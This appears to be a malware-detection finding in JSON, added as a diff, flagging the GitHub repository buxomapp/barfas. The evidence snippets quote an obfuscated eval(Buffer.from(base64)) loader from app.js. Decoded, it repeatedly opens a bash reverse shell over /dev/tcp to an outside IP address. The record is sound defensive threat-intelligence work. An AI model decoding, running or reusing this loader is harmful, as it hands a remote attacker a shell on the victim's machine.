@@ -1,0 +1,82 @@
+{
+  "finding": {
+    "key": "repository:buxomapp/barfas",
+    "kind": "repository",
+    "family": "",
+    "id": "buxomapp/barfas",
+    "url": "https://github.com/buxomapp/barfas",
+    "registry": "github",
+    "owner": "buxomapp",
+    "status": "confirmed",
+    "confidence": "review",
+    "score": 9,
+    "detection_method": "signature_match",
+    "attribution": "",
+    "campaign_id": "",
+    "rules": "obfuscation/eval-decoded; obfuscation/base64-buffer",
+    "evidence_locations": "app.js:11; app.js:12",
+    "c2_hosts": "",
+    "iocs": "app.js",
+    "matched_signatures": "eval \"Buffer.from\" \"base64\"",
+    "reasons": "Shares a confirmed-malware code signature ['eval \"Buffer.from\" \"base64\"'] | Tier-2 confirmed (bash score 8)",
+    "osm_status": "not_submitted",
+    "osm_threat_id": "",
+    "first_seen": "hunt-20260722T060253Z",
+    "last_seen": "hunt-20260722T060253Z",
+    "evidence_file": "repositories/buxomapp_barfas.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": "app.js",
+      "line": 11,
+      "category": "obfuscation",
+      "rule": "eval-decoded",
+      "snippet": "decoded payload -> require/module hijack, child_process/exec | eval(Buffer.from(\"c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDg"
+    },
+    {
+      "file": "app.js",
+      "line": 12,
+      "category": "obfuscation",
+      "rule": "eval-decoded",
+      "snippet": "decoded payload -> require/module hijack, child_process/exec | eval(Buffer.from(\"c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDg"
+    },
+    {
+      "file": "app.js",
+      "line": 11,
+      "category": "obfuscation",
+      "rule": "base64-buffer",
+      "snippet": "eval(Buffer.from(\"c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksID"
+    },
+    {
+      "file": "app.js",
+      "line": 12,
+      "category": "obfuscation",
+      "rule": "base64-buffer",
+      "snippet": "eval(Buffer.from(\"c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksID"
+    }
+  ],
+  "commit_sha": "c64874ba6f0e626344bca36a764adda5f9d4418d",
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/buxomapp/barfas",
+    "version_info": "all",
+    "threat_description": "Obfuscated loader. Payload in app.js.\nThe eval(atob(...)) loader hidden in a project file is Contagious Interview (DPRK-attributed) tradecraft.\nAttribution: the tradecraft is consistent with North Korea, but a single signal is a lead rather than an attribution, so we do not attribute it on this evidence alone. Signals: Delivery vector matches Contagious-Interview tradecraft: obfuscated-eval-atob-loader.\nFound by GitHub code search for a confirmed malware signature: eval \"Buffer.from\" \"base64\".\nConfirmed by static analysis; the code was read, never executed.",
+    "payload_description": "Malicious payload found in: app.js\n- app.js:11: decodes a hidden blob and executes it at load time (obfuscated loader) (+1 more)\n- app.js:11: hides code in an encoded blob that is decoded and run (+1 more)",
+    "publisher": "buxomapp",
+    "severity_level": "high",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "dprk-consistent-tradecraft",
+      "obfuscated-eval-atob-loader",
+      "obfuscated-loader"
+    ],
+    "evidence_references": "https://github.com/buxomapp/barfas/blob/c64874ba6f0e626344bca36a764adda5f9d4418d/app.js#L11\nhttps://github.com/buxomapp/barfas/blob/c64874ba6f0e626344bca36a764adda5f9d4418d/app.js#L12",
+    "verified_iocs": "app.js",
+    "contributors": [],
+    "first_seen": "2026-07-22T06:02:53Z",
+    "last_seen": "2026-07-22T06:02:53Z"
+  }
+}
